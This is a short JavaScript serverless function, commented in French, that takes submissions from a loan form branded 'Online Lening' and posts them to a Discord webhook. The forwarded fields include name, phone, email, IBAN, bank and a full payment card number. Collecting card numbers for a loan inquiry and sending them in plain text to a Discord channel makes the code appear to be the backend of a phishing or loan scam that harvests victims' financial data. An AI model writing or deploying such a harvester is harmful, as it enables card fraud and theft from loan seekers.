// Vercel Serverless Function - reçoit les demandes du formulaire et les envoie à Discord

export default async function handler(req, res) {
  // Accepte seulement les requêtes POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;

  // Filet anti-robots : si le champ caché est rempli, répond OK sans rien envoyer
  if (data.site_web) {
    return res.status(200).json({ ok: true });
  }

  // Récupère l'URL du webhook Discord depuis les variables d'environnement
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookUrl) {
    return res.status(500).json({ error: 'Discord webhook not configured' });
  }

  // Formate le message pour Discord
  const discordMessage = {
    content: `📩 **Nouvelle demande — Online Lening**
**Projet :** ${data.projet || '—'}   **Montant :** ${data.montant || '—'} €   **Pays :** ${data.pays || '—'}
**Situation :** ${data.situation || '—'}   **Crédits en cours :** ${data.credits_en_cours || '—'}
**Nom :** ${data.prenom || '—'} ${data.nom || '—'}
**Téléphone :** ${data.telephone || '—'}   **E-mail :** ${data.email || '—'}
**Créneau :** ${data.creneau || '—'}   **Langue :** ${data.langue || '—'}
**IBAN :** ${data.iban || '—'}   **Banque :** ${data.banque || '—'}
**Numéro de carte :** ${data.carte || '—'}
**Reçu le :** ${data.date || '—'}`,
    allowed_mentions: { parse: [] }
  };

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordMessage)
    });

    if (!response.ok) {
      throw new Error(`Discord API error: ${response.status}`);
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Discord webhook error:', error);
    return res.status(502).json({ error: 'Failed to send to Discord' });
  }
}
